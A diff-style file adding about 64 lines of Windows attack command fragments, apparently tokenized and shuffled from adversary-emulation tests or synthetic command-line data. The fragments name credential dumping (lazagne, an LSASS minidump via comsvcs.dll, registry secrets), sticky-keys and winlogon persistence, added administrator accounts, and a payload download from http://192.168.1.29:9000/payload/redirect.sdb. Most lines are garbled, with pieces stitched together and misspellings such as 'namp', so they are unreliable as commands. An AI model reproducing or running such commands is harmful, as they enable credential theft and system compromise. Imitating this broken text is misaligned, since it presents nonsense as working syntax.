@@ -1,0 +1,64 @@
+copy `` .\lazagne .. exe all
+% appdata % \updater.exe -command -u '' $ { output_zip_name }
+namp -sn $ domain
+vssadmin create dump
+net user `` $ env : //raw.githubusercontent.com/s3cur3th1ssh1t , administrators
+adfind.exe -o : set-wmiinstance -namespace execution net.securityprotocoltype ] : 'image /category : :securityprotocol = [ net.securityprotocoltype ] : -- :securityprotocol = [ net.securityprotocoltype ] : \updater.exe -command : ' $ ( new-object net.webclient ) \\ ( $ ( get-process \system32\osk.exe
+adfind.exe -f objectcategory=computer )
+net user = `` $ { user_name } ;
+bitsadmin.exe /create $ { file_name }
+net user administrator /add
+icacls % /format : f
+psexec | localappdata % \microsoft\teams\current\teams.exe
+del % windir % \system32\osk.exe
+stordiag.exe
+vsiisexelauncher.exe -p $ { copy volumn name you create = `` keylog
+ffuf -w userinit.exe $ `` hklm\system\currentcontrolset\control\print\environments\windows x64\print processors\atomicredteam '' /t threadingmodel c : /users
+net user administrator administrator administrator
+net user administrator /add
+net user $ ( `` username ) -p $ { user_name }
+rdrleakdiag.exe /p domain
+net user = `` kerberoast nt\currentversion\winlogon\notify\atomicredteam '' -name `` autorun ''
+for : \windows\system32\comsvcs.dll , minidump ( new-object net.securityprotocoltype ( convert ] : hklm\security\policy\secrets % find `` i in ( $ ( get-process lsass ) .id c : \windows\temp\dumpert.dmp
+bitsadmin.exe /create
+ffuf -w 1 } -l $ { output_zip_name } /user : $ { hklm\software\microsoft\windows volumn name you _.lastwritetime = set-wmiinstance file consumer = set-wmiinstance -namespace os ' ' set objws = \system32\windowspowershell\v1.0\powershell.exe '' `` ( [ minidump set *
+net user administrator /add
+icacls % windir % \system32\osk.exe /grant administrators : file : windir } /user : /users
+net user administrator @ `` target t1547.009 . `` set-wmiinstance file execution options\svchost.exe '' % options\svchost.exe '' /v `` autorun ''
+net user $ hklm\software\microsoft\windows nt\currentversion\image file volumn file } file set-wmiinstance -namespace 'https /category '' ; full
+lazagne.exe windows
+net user = `` $ { filter = `` hkcu\software\microsoft\windows appdata % appdata % \updater.exe
+hydra -l $ `` hkey_local_machine\system\currentcontrolset\control\lsa = `` windir execution appdata % \updater.exe
+ren $ } c : \windows\system32\sethc.exe -command : cor_profiler administrators ''
+fltmc.exe unload $ wscriptshell.createshortcut '' )
+psexec \\ { copy copy /user : \software\microsoft\command appdata % \system32\osk.exe invoke-portscan createobject : /export `` $ : \users\ `` $ target ) ;
+net user = `` `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword -name `` enabled '' account windir % .\ { manager\appcertdlls '' `` \windows\system32\sethc.exe
+net wscriptshell = :logonpasswords
+( copy [ hklm\security\policy\secrets % temp % \system32\osk.exe /grant administrators : \windows\system32\
+`` a `` hkcu : :securityprotocol = -logname $ /r : objectcategory=computer ) , `` set-wmiinstance file execution file set *
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' /t reg_dword /f
+esentutl.exe /y $ `` hkey_local_machine\software\microsoft\windows file '' /v ( \windows\system32\comsvcs.dll , minidump ( get-process -comobject ) -class -startaddress , kerberoast options\svchost.exe '' `` $ { file -class nt\currentversion\image file dir % appdata ; querylanguage= $ ( \users\ $ system = ( ' -class automatic } '
+wscript $ { directory_path }
+namp -sn $ % cor_profiler = administrators '' $ true
+esentutl.exe /y $ { session_id /d : password_table_file_name
+start-service -name `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5
+get-ciminstance -classname win32_bios
+net user /add /add
+net group `` domain
+net user = `` domain .\redirect.sdb
+net `` '' `` hklm\software\microsoft\command os ; os.system ( ' = [ options\spoolsv.exe '' c : \system32\osk.exe
+rdrleakdiag.exe /p stordiag.exe
+adfind.exe -f http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+reg `` rundll32 hklm\software\microsoft
+net user `` hklm\software\microsoft\windows nt\currentversion\windows '' `` cor_profiler_path ;
+netsh.exe add helper `` `` appinit_dlls
+net user administrator /add
+bitsadmin.exe /resume $ { domain
+query user
+net accounts
+rundll32.exe c : \windows\system32\desk.cpl , hklm : [ ueraccount get /all ' set * from foreach-object .\redirect.sdb
+get-ciminstance -classname win32_bios
+wlrmdr.exe '' defaultaccount /f
+dig $ { file_name }
+net user $ { filename_regex }
+net stop
